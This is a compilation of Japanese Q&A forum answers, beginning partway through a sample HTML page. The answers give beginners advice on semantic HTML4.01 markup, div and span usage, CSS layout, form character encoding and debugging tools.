＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿</div> ＿＿<div class="section" id="tediously2"> ＿＿＿<h3>御託２</h3> ＿＿＿<p>ここに御託を並べる・・・</p> ＿＿</div> ＿＿<div id="contentTable"> ＿＿＿<ol> ＿＿＿＿<li><a href="#productList">商品</a></li> ＿＿＿＿<li><a href="#tediously1">御託1</a></li> ＿＿＿＿<li><a href="#tediously2">御託2</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
No.4です。 何度もすみません。 先ほどのHTMLはそのままです、は間違いで、buttonにvalueにて値を与えてください。 0から始まって上から順番に付けるイメージです。 <button type="button" value="0">●</button> ・ ・ <button type="button" value="4">●</button>
基本的なことですが、タグはデザインするために書くものではありません。 HTMLは、文章をそれを構成する要素(部品)に分解して、その部品がどのような要素(element)であるかをタグを使ってマークアップするものです。--HTMLを作成する上で最も重要な、というか本質です 　特定の文字が略語や頭文字でしたら<abbr>というタグを使ってそれが略語であることを示します。適当なタグがないときは<span>とclass名を使ってマークアップします。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　たとえば、次のように書きます。 <blockquote><!-- 引用のブロックであることを示す --> <p><!-- 段落 --> <abbr title="Hyper Text Markup Language">HTML</abbr>は、どんな環境からも<span class="memo">Web</span>の情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つ<abbr title="Parsonal Computer">PC</abbr>や、<span class="devices">携帯電話</span>、<span class="devices">モバイル機器</span>、<span class="devices">音声入出力機器</span>、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 </p> </blockquote> というふうに、誰が読んでも、あなたが数年後に読んでも、機械が読んでも、この部分が引用であり、ひとつの段落があり、その中に略語があり、デバイス名を示す単語があるとわかりますね。これがHTMLの目的です。 　それをどのように表現するかはスタイルシートと言う別の仕組みです。<h1>で括ると</h1>大きな文字で前後にすこし間隔が取られるのは、ブラウザが持っているスタイルシートによるもので、読み上げソフトは大きな声で読むでしょうし、検索エンジンはそこが見出しだと理解できます。 『スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　このあたりを読んでおくと良いでしょう。 ＞mouseout innertext=''の部分にフォントとサイズ指定をする方法があれば教えて下さい。 　javascriptを想定されているのだと思いますが、javascriptは無効になっていたり、使えないブラウザもあのでスタイルシートで指定すほうが楽です。 　下記に、サンプルを上げておきます。一部あまり知られていない指定もしてありますが、それはあとで勉強するとして、HTMLとスタイルシートの関係を知ってください。 ★HTML4.01strictです。 　Another HTML-lint 5 ( http://www.htmllint.net/ ) 　The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_input ) 　で検証済みです。 ★スタイルシートはCSS2.1です。 　W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　で検証済み ★文字コードはShift_JISです。タブは＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* 段落の指定 */ p{margin:0;text-indent:1em;line-height:1.5em;} /* 引用ブロックのデザイン */ blockquote{border:dotted 1px blue;padding:0.5em 1em;} /* 引用中のabbrの指定 */ abbr{font-style:italic;} /* abbrやspanのデザイン */ abbr{color:blue;font-weight:bold;} span.devices{color:green;font-weight:bold;} /* マウスオーバーしたときの指定 */ abbr:hover,span.devices:hover{color:red;position:relative;} abbr:hover:after{ content:attr(title); position:absolute;bottom:1.6em;left:0; border:solid red 1px; white-space:pre; background-color:white; padding-right:0.5em; } --> ＿</style> </head> <body> ＿<h1>タイトル</h1> ＿<p>下記はサンプルです。</p> ＿<h2>仕様書を読んでおきましょう。</h2> ＿<p>下記は<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … HTMLの略歴</a>からの引用文です。</p> ＿<blockquote> ＿＿<p> ＿＿＿<abbr title="Hyper Text Markup Language">HTML</abbr>は、どんな環境からも<span class="memo">Web</span>の情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つ<abbr title="Parsonal Computer">PC</abbr>や、<span class="devices">携帯電話</span>、<span class="devices">モバイル機器</span>、<span class="devices">音声入出力機器</span>、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ＿＿</p> ＿</blockquote> </body> </html>
要所のDIVに背景色（background）などを付けると、効いているか判断できます。（旧IE以外の話） 幅と高さが保たれていれば問題ない場合が多い。（旧IE以外の話） １、右上のピンクのボックス内の最後 ２、上段の黒のボックス内の最後 ３、下段のグレーの上部は不要 ４、下段のグレーのボックス内の最後 その他のところでは、 「floatを切る」場所にclear要素が必要だが、 ul>liなどには別な要素で勝手にclear出来ない。文法違反・・・ また、現在の構成では、 その別の要素がないのでclearがおかしい・・・ 疑似要素でも可能。 簡単なテクニックとしては、clearFIXなどで解決できる（賛否両論ある）
hrefはクリックしたときにどのページに移動するかで、 onClickはクリックしたときに何をするかです。 このあたりが重複しているのが問題かもしれません。 とりあえずonClick="return false;"を消したらどうなりますか？
htmlファイルで900KBはすごいですね。 私は普段仕事でサイトを作ってますが、20KBを超える事はまれです。 どんな作り方をしてるのか、非常に気になります。 ちなみに、PCのスペックはしょぼいどころか十分すぎるスペックです。 ネットを見たり、テキストエディタで編集する程度なら全く問題ありません。 （というかPCの持つポテンシャルを使いきれません） それで不満に感じるのは動画や3Dの処理くらいかと思います。
HTML本体の文字コード・・と言うのは遠い昔の--20年位前(^^)のお話で、HTML4.01(1999年)以降は <form action="[URI]" method="post|get" accept-charset="文字符号化方法のリスト"> →accept-charset ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ですから、本文の記述に関わらず、エンコードは指定できます。 accept-charset="UTF-8" accept-charset="iso-2022-jp,UTF-8,EUC-JP,Shift_JIS" とブラウザが可能なエンコードを順次テストできるようリストを書いておくことも行われます。 　しかし、現実にはブラウザは様々で、携帯電話などは指定に関わらずShift_JISで送信したり、本文の文字コードに従うブラウザも実在しますから、データを受け取ったサーバー側で文字コードを判別して適切にエンコードする必要があります。 　PerlにしろPHPにしろ、文字コード判別のモジュールは利用できますから、問題ないでしょう。 ASCII JIS > UTF-8 > EUC-JP > SJIS ( http://www-ise3.ist.osaka-u.ac.jp/miura/?PHP%20G … ) ページの文字コードとは違う任意の文字コードをformから送信する方法｜web bibo ( http://www.webbibo.com/blog/htmlcss/accept-chars … ) とか・・ 　
＞のようにdivは使わずに書いています。 　それは、文法的には間違いではありません。しかし、仕様書には下のように書かれています。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『次の例は、見出しとそれが導くテキストとをDIV要素で連結する方法を示している。こうすることで、スタイルシートによってセクション単位のスタイル定義(背景色やフォント設定等)を行うことができる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　このあたりを読むと、DIVの本来の使い方が詳しく示されています。 　ところが、これらの文章は仕様書のすべてを理解している人ならともかく、そうでない多くの人には読み飛ばされてきました。その反省からHTML5では、『文書をよりよく構造化するために、次の要素が新しく追加されました。 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　・・section・article・aside・hgroup・header・footer・nav・・・ 　これらは、HTML4.01で想定していた『『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する』のidやclass名です。 <div class="section"> 　<h2>1つ目のセクションのタイトル</h2> 　<div class="figure"><img src="1つ目のセクションの画像"></div> 　<p>1つ目のセクションの文章</p> </div> <div class="section"> 　<h2>2つ目のセクションのタイトル</h2> 　<div class="figure"><img src="2つ目のセクションの画像"></div> 　<p>2つ目のセクションの文章</p> 　<div class="section> 　　<h3>項見出し</h3> 　　<p></p> 　</div> 　<div class="section> 　　<h3>項見出し</h3> 　　<p></p> 　</div> </div> <div> 　<h2 class="">3つ目のセクションのタイトル</h2> 　<div class="figure"><img src="3つ目のセクションの画像"> 　<p>3つ目のセクションの文章</p> </div> 　こうしてセクションごとにdivで括ってあると、スタイルシートで章番号や項目番号を振ることができます。 --レンダリング結果------------------------------- 一章 1つ目のセクションのタイトル 　1つ目のセクションの文章　■画像 二章 2つ目のセクションのタイトル 　2つ目のセクションの文章 ■> 　二章1項　項見出し 　　記事 　二章2項　項見出し 　　記事> 三章　3つ目のセクションのタイトル 　3つ目のセクションの文章　■ ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで、スタイルシートのcounterを使ってます。 　このように、文書構造を補完する目的でDIVを適切に利用するとHTMLもスタイルシートもわかりやすくなります。たとえば div.section div.section{font-size:0.95em;} とするとスタイルシートを読むだけで、章→項→小項と下がるたびにフォントサイズを少しずつ小さくなるように指定してあることが一目瞭然ですね。 　
<a href="の値は、URIであって、mailto:でメールクライアントが起動するためには、利用しているパソコンに、デフォルトのメールクライアントが設定してあり、かつブラウザでそれが可能なように設定してある必要があります。最近はウェブメールの普及でパソコンにインストールしてあっても設定していない場合や、そもそもインストールすらされていないものがあります。 　また、この方法では文字化けなどがおきやすく実用には耐えません。特に社用となれば・・ <a href="/cgi-bin/mailForm.cgiとか・・で、メールホームを呼び出して、サーバー側のプログラムで処理します。 ・メールクライアントをインストール・設定している必要がありません。 ・自分のものでないパソコンからも利用できます。 ・送信履歴などの管理が出来ます。 ・・・・その他、たくさんの利点があります。
＞現在はあまりtableタグを使用しない方が良いと 　表であるものをtableでマークアップするのは正しいです。 　表でないものを--主にデザインのために--tableでマークアップするのは誤りです。 →『非視覚系メディアでのレンダリングに際して問題を起こすことがあるため、単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 →『ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　「現在」がいつのことを指すのかわかりませんが、HTML4.01が勧告になった1999年(12年前)が昔なら、昔からtableをデザインのために使用するのは間違いでした。 →Tables should not be used as layout aids. ( http://www.w3.org/TR/2011/WD-html5-20110525/tabu … )--HTML5仕様書「tableをレイアウト目的で使用すべきではありません」 ＞勉強で、width800px, height700pxでDiv組した中に文字を入力して簡易のホームページを作りました。 　が、そもそもの初心者がおちいりやすい最大の誤りです。 　HTMLはプレゼンテーションのためのものではありません。文書をそれを構成する要素に分解して、それぞれの構成要素が何であるかをタグを使ってマークアップするメタ言語です。ワープロやDTPとは別物です。デザインのためならPDFというすばらしいフォーマットがあります。 　最初の最初が間違っている--とんでもない参考書かサイトを参考にしている？？？ 　divやspanは、『id属性及び class属性と併用することで、文書に構造を付加するための ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』タグです。たとえば、その部分が文書の本文だと知らしめたいときは <div class="section"></div>、ナビゲーションのためなら<div class="nav"></div>のように使います。 ＞もう片方のPCで見ると下側の文章が切れて全ての文章が入っていないようです。 　ブロック要素のoverflowプロパティのデフォルト(Initial)は、visible(表示)ですから、はみ出した部分は、overflow:hiddenを指定していない限り表示されるはずです。ただし、次のブロックの背景色にtransparent以外を指定していると、それで覆い隠されてしまいます。 ★HTMLは単に文書構造をマークアップするためだけに使用すること。 ★その文書構造を利用してスタイルシートでプレゼンテーションを指定していくこと 　これが基本です。最初にここを間違うと上達しません。 →HTML,CSSの記述について - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7636233.html ) 　で回答したサンプルをごらんいただくと、あの程度の複雑なことをするにしてもHTMLが複雑になるわけではありません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　のあたりをよく読んでおくこと・・ 　 　
Firebugを使ってみるのが一番手っ取り早いかと思います。 今後の為にも、是非一度お試しください。 ちなみに、IEの場合はFirebug Liteが使えます。 http://getfirebug.com/firebuglite#Stable ここの「Firebug Lite」をお気に入りに入れ、デバッグするページを開いた状態でこのお気に入りページを開いて下さい。 デバッグ用のJavascriptが動作します。
高校1年生で今すぐ活かせるというのだと、 自分の周りの友人知人やネット上ででHP作りたい人のページを作ってあげる。 学校や部活のHPを作ってあげるくらいでしょうか？ 自分でも親でもいいので知り合いのお店のHPをつくってあげるとか 学校などのHPを作り上げることができたなら 自分のHPで作ったよ紹介したりすると、いつの間にか依頼が来たりしますし （有償無償いろいろと） もしweb系の仕事に就きたい時にも、ポートフォリオの中の一つになるのでいいかなとは思います。 先の話でアレですが もし、もうすでにPC基準のHTMLをマスターされているなら今度はiPhone、Androidoスマートフォン向けのサイトを作ったり javascriptを身につけていくと、 就職の時に幅が出るのはたしかですよ♪
一度、通しでよいので仕様書を読んでおくこと。これはこれからウェブサイトを構築しようとしたときの必須です。 HTML 4.01仕様書(邦訳) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　HTMLとは、Hyper Text Markup Languageの略で、文書をそれを構成する要素に分解して、それぞれの要素が何であるかをタグを使ってマークアップするメタ言語です。 　その要素には、<h1>見出し</h2>、<p>段落</p>のようなブロック要素と、そのブロック要素に含まれるブロック要素や、<img>や<strong>重要</strong>とかの行内要素があります。ブロック要素は、その前後でマージンをとってその前後と分けられるものですが、行内要素は次の段落が来るまで改行されず折り返して配置されます。 →7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　この場合 <body> <a name="１段落目">●１段落目</a> <!-- ありえません。a要素は行内要素ですからbody要素には入れられません!!!--> <Div Align="right"> <A href="#１段落目">▲</a> </Div> <!-- divは汎用ブロック要素ですから、必ず前後に余白をとって改行されます。--> <Div Align="right"><A href="#２段落目">▼</a> </Div> <!-- alignは非推奨です。はっきり言うと使うなということ --> <a name="２段落目">●２段落目</a> <!-- 行内要素ですから、ここには書けません。--> </body> </html> body部分のみだと・・ <body> 　<p><a name="">●一段目</a></p> 　<p><a href="#１段落目">▲</a> <a href="#２段落目">▼</a></p> 　<p><a name="２段落目">●２段落目</a></p> </body> 正式には、 <body> 　<div class="header" id="TOP"> 　　<h1>見出し</h1> 　　<p>・・・・</p> 　</div> 　<div class="section" id="section1"> 　　<h2>本文見出し</h2> 　　<p>・・・・・・・・・・・・・</p> 　　<p>・・・・・・・・・・・・・</p> 　　<p><a href="#TOP">TOP</a> | <a href="#section1">本文</a> | <a href="#documentInfo">文書情報</a> 　</div> 　<div class="footer"> 　　<h2 id="documentInfo">文書情報</h2> 　</div> </body> とか、ですかね。class名は文書構造を示すものを?? →DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　最初に ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　などで実例を元に勉強してください。 　そして仕様書だけは一通り読んでおくこと。とても大事なことが書かれています。全部覚えておく必要はありませんが、必要なときに調べられるよう ★HTML 4.01仕様書(邦訳) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　参考にされている資料がとても古いもの（あるいは間違っている）のようです。alignなんて使うなと・・ →HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これが1999年です。次期HTML5では、alignなどは完全に使えなくなります。 ★デザインはスタイルシートで行います。 →HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　あせったらダメです。引き返すのが大変な袋小路に踏み込んでしまいますよ。
tableの数行に渡るデータを一列に並べるということは、tableの本来の使途からありえないはずです。 マークアップ自体が誤っているのではないかと・・ それはさておき、 <table summary="test"> <tr><td>1</td><td>2</td><td>3</td><td>4</td></tr> <tr><td>5</td><td>6</td><td>7</td><td>8</td></tr> <tr><td>9</td><td>10</td><td>11</td><td>12</td></tr> <tr><td>13</td><td>14</td><td>15</td><td>16</td></tr> </table> に対して table[summary="test"]{display:block;width:868px;} table[summary="test"] tr{display:inline;} table[summary="test"] tr td{display:block;float:left;width:50px;border:solid 1px gray;} ★dispaly:inline-blockでも並ぶが、white-spaceの処理で半角が開きます。
スタイルシートのみです。 html,body{margin:0;padding:0;} div.header,div.section,div.footer{ ＿width:90%;margin:0 auto; ＿max-width:900px;min-width:640px; } div.section{position:relative;} div.section:after{content:"";display:block;width:100%;clear:left;} div.section div{margin:0;} #merchandise{width:80%;margin-left:20%;} #merchandise ol,merchandise ol li{ ＿display:block;list-style:none;margin:0;padding:0; } #merchandise ol li{ ＿width:220px;height:360px;overflow:hidden;float:left; ＿border:solid 1px gray;position:relative;margin:5px; ＿text-align:center;padding-top:5px; } #merchandise ol li ol li{ ＿width:100%;height:auto;border:none; ＿position:static;margin:0;margin:5px; } #merchandise ol li ol li+li{ ＿width:200px;text-align:left;text-indent:1em;margin-top:20px; ＿height:70px;line-height:18px;padding:2px 5px; } #merchandise ol li ol li+li+li{ ＿text-align:right;text-indent:0;position:absolute; ＿bottom:5px;right:5px;border:none;height:auto; } #merchandise ol li ol li+li:hover{ ＿position:relatve;height:106px;z-index:100;overflow:auto; ＿background-color:white;border:solid 1px black; ＿box-shadow:3px 3px 3px 2px rgba(0,0,0,4); } #merchandise ol li ol li+li+li:hover{height:auto;border:none;box-shadow:none;} #merchandise ol li ol li+li:hover+li{z-index:-10;} #merchandise ol li.new{padding-top:220px;text-align:right;height:145px;z-index:20;} #merchandise ol li.new ol{position:relative;top:-216px;height:360;z-index:-10;} #merchandise ol li.new ol li+li+li{ ＿text-align:right;position:absolute;bottom:-340px; } #merchandise ol li.new:before{ ＿content:"NEW";color:red;position:absolute;top:0px; ＿left:0;border:solid 2px red;padding:2px;z-index:10; } div.section div.tableContent{ ＿position:absolute;left:0;top:0;width:20%;height:100%; ＿background-color:rgb(220,220,255); } div.section h2{line-height:2em;background-color:aqua;margin-bottom:10px;}
HTML5では、アップロード(送信)するファイルの選択で、複数ファイルの選択が可能になったのですが、IEは対応していません。そのため、IEの基本機能としては、複数ファイルの選択は不可能です。 そのため、IEで複数選択を実現する方法としては、Flash や ActiveX を使うしかありません。 自分のサイトでそういった機能を実現したい場合、 そういった複数ファイルのアップロードを実現するものをフリーで公開されてたりしますので、それを利用するのがいいでしょう。 例えば、Flashで実現するjQueryプラグインで、SWFUpload というものがあります。 http://phpspot.org/blog/archives/2009/06/flashsw …
基本はHTML4.01です。それもstrictです。CSSは2.1です。 なぜなら、 ・多くのブラウザベンダーでウェブ標準とみなしているものはHTML4.01+CSS2.1だからです。 ・HTML5はまだ未勧告です。 　「スマホのみを対象とする。」「video,canvasなど新しい要素を使いたい」以外はHTML4.01 　HTML5で大きく変わったわけではありませんが、それはあくまでHTML4.01をきちんと理解した上での話です。いきなりHTML5は無理です。 (注意) 　HTML4.01には、strict,transitional,framesetの３種類がありますが、必ずstrictを学びましょう。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　と１２年前(1999年)の勧告以来、言われているのにほとんど守られていない。ユーザーエージェントは他のバージョンも古いバージョンも表示すべきとされていますが、著者はstrictで作成しろ！！と言われ続けてきた。 　HTML4.01ををそのままXML化したXHTML1.0は、strict,transitional,framesetの３つのDTDがありますが、XHTML1.1,HTML5にはありません。 　しかしながら、strictでない書き方が使い続けてきました。 　HTML5ではその反省から、『ユーザーエージェントは古い要素や属性をサポートし続けなければなりません。このため、HTML5 仕様は製作者に対する要件と、ユーザーエージェントに対する要件を明確に分けています。 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　もっとも良いのは ・HTML4.01strictを正確に学ぶこと ・CSS2.1を正確に学ぶこと 　その上で、それと平行して 「HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」 　を学ぶこと。 　仕様書を理解していないと思われるソースが氾濫しています。仕様書を一度でも読めばそんなもの書かないだろうにと思われるもの・・ <div id="wrapper"> 　・・・wrapperなんて、文書構造を示すものじゃない。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　HTML5の仕様書を読めばわかりますが、 <div class="article" id="TOP"> 　でしょうね。articleは文書内に何度も登場するのでclassでしょう。 <div id="left">じゃなくて、それがナビゲーションなら<div class="nav">でしょう。・・
こちらをお読みください。 17 フォーム ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　<form action="[URL]"> のactionで指定されたURLのファイル(実行ファイル--プログラム)に、その内容が送信されますから、それを受け取ったサーバーのプログラムで処理します。 　フォーム内のinput要素は、コントロールと呼ばれます。コントロールで変更された値は、送信ボタンによって、Webサーバやメールサーバ等のエージェントへ提出されます。 CGI RESCUE チャレンジＣＧＩ - 初心者向けミニ講座 ( http://www.rescue.ne.jp/cgi/beginners/ ) 　とかで手順を追って学びましょう。
no.3ですが、簡単な例を <div class="photo"> 　<p><img src="[URL]" width="240" height="180" alt="">と<img src="[URL]" width="360" height="180" alt=""></p> </div> のとき、画像の高さを揃えるなら div.photo p img{display:inline-block;height:120px;width:auto;} で高さは同じで縦横比は変わらず伸縮されます。line-heightでテキストの位置も調整できるでしょう。
vertical-alignを使う方向で、htmlを尊重しますと以下のｃｓｓに置き換えるではどうでしょう？ #header h1 { width: 95px; height: 25px; margin:auto; } #gNav { width: 570px; height: 38px; margin: 0 auto; padding: 0; background-image: url(画像url); background-repeat: no-repeat; } #gNav ul{ display:table-row;/*liをテーブルのセルにするなら、テーブルの1行を指定する必要があります。*/ } #gNav li {/*liはブロック要素。画像が1個を使いまわしなら #gNav liで指定します。li #first と統合しました。*/ text-align: center; display:table-cell;/*ご希望のもの*/ vertical-align: middle;/*ご希望のもの*/ /*float: left;*/ width: 105px; height:38px; background:#ccc url(画像url); background-repeat:no-repeat; } /*これは効かないでしょ？消します。 #gNav a { vertical-align: middle; }*/ インライン要素の性質とブロックレベル要素の性質を理解していないのがうまく行かない原因かと思います。 インライン要素（例えば<a>）にwidthやheightは思われているような解釈にはcssではなりません。widthはそもそも効きませんし、heightは効きますが、効き方が思われているのとは違うと思います。 すごく根本的な事、インライン・ブロックレベルの違いは基礎中の基礎です。vertical-alignはインライン要素とテーブルセルにしか効きません。この場合のインライン要素のvertical-alignとは<span style="font-size:3em">あ</span><span style="font-size:2.5em">あ</span><span style="font-size:2em">あ</span><span style="font-size:1.5">あ</span>的な事です。出来なかったソースではliというブロック要素をまたいでいるので同列にはなりません。 table-cellは惜しかった。どこからどこまでがtrにあたるのかを指定してやってください。tableに変えるのでfloat:leftは消します。
端末側のパソコンの時間は結構ずれているので、サーバー側で処理したほうがよいのでは？ ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = localtime(); ・・ 　どうしてもパソコン側の時間を取得したければ、javascriptを使ってtimeを送らせてサーバー側で ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = $form{'time'}; 　が簡単でしょう。ただし、javascriptが無効にされているブラウザでは意味ありません。パソコンの時間がずれているか否かを判別する用途ならともかく、通常はサーバーの時間で一元管理すべきでしょう。
＞パスワード CGI - Google 検索 ( https://www.google.co.jp/#hl=ja&safe=off&sclient … ) 　で検索するとたくさんでてくるでしょう。 1) メールアドレスをidにするときは、最終確認もメールで行うと良いでしょう。 　ロボットによる自動収集を防止するため 2) そうでない場合は、idは任意のものにしておいて 　a) 別途メールアドレスを記入してもらって同様な確認をする。 　b) ゆがんだ画像で英数字などを表示してそれを入力してもらう 　などの対策をとります。 3) 秘密の質問などでリマインダー機能を付けておくと後々楽です。 パスワード CGI リマインダー - Google 検索 ( https://www.google.co.jp/#hl=ja&safe=off&sclient … )
　*全称セレクタ(詳細度は0です)で、すべてのタイプ(HTMLの要素)に対してmarginとpaddingを0にするのは、オーサリングツールのテンプレートで、かってよく使われていた方法が広まったのだと思われます。 　テンプレートをそのまま利用するならともかく、自分でスタイルシートを記述するときは弊害が多すぎます。 ・すべての要素に対して、登場するたびすべて指定しなおさなければなりません。 　たとえば、リスト ・そのためスタイルシートが肥大化します。 　基本的には html,body{margin:0;padding:0;} 　とだけしておくのが無難です。 ＞全体にCSSをかけてもボタンのデザインが崩れない方法がないのか知っている方がいれば教えて頂けないでしょうか？ 　先に説明したように、新しいタイプ(要素)が登場するたびに、設定しなおしてください。 　それしかありません。 　*{}でリセットするのは止めましょう。 　
何をしたらどこが文字化けするとか書いていただかないとね... すでに文字化けしているファイルは直りません。 >「UTF-8Nの可能性を考慮」...バージョンが違うからでしょうか？ 正解、最新バージョンにはありません。
キーボードのprintscreenで、画面をキャプチャーして画像ソフトで切り抜き、縮小する。 専門のツールもありますが、必要ないでしょう。
インラインフレームで出来るんじゃないですか？ ただ、Stage.scaleModeプロパティってActionScriptみたいなもので、 Flash作成時にソフト側で設定するものなので、HTMLで書いても無効でしょう。 それから質問の書き方だとFlashそのものが指定サイズに縮小されるだけです。 きちんとFlashを埋め込んだ上で、インラインフレームで表示領域を指定すべきです。 そうすれば左上が基準になるので実現できると思いますよ。 サンプル（リロードはF5） http://cgi43.plala.or.jp/zaq_501/sample/iframe.h …
alphaEDITかなんかで作ってますか？ タグも複雑でソフトの仕様もよく分かりませんが、 とりあえずインラインフレームの属性でスクロールを非表示（scrolling="no"）にしてみたら良いんじゃないですか？ 直接の解決策でなくて申し訳ないんですが。
他のブラウザでも同様ですか？ 　もし、firefoxでも同様な現象でしたら、fireox+fireBugでそのページを表示させて、どのようなスタイルが適用されているかを確認すると良いでしょう。 　firefoxには、豊富なアドオンがあります。特に 開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … ) 　は、firefoxの歴史、仕組みから極めて豊富です。 　もし、ページ側に問題があるとしたら、その原因や修正もその場で確認できます。
MODX Japanの中の人です。 いつもご利用いただきありがとうございます。 おそらく、aタグで大きい画像にリンクしているので、限界があるのではないかと思います。 CSS・JSを使えばもっと色々出来るとおもいますが、一つの解決策として、iframeを使ってはいかがでしょう。 <li><a href="img/n-common/slide/大きい画像ファイル名.html（もしくはリソースID）"><img src="img/n-common/slide/小さい画像ファイル名"title="写真の名前"alt="写真のキャプション" target="image_frame"></a></li> 大きい画像ファイル名.html img→n-common→slideというコンテナの階層を作り、その中にリソースを作成して下さい。 MODX内でコンテナ・リソースを作成しても、実際のファイルが優先して使用されます。 テンプレートは[*content*]のみの空白のテンプレートを作成して使用してください。 <html> <head><title>ごにょごにょ</title></head> <body bgcolor="#FFFFFF"> <a href="img/n-common/slide/解説文.html（もしくは解説文リソースID）"><img src="img/n-common/slide/大きい画像ファイル名"title="写真の名前"alt="写真のキャプション"></a> </body> </html> ご参考になれば幸いです。
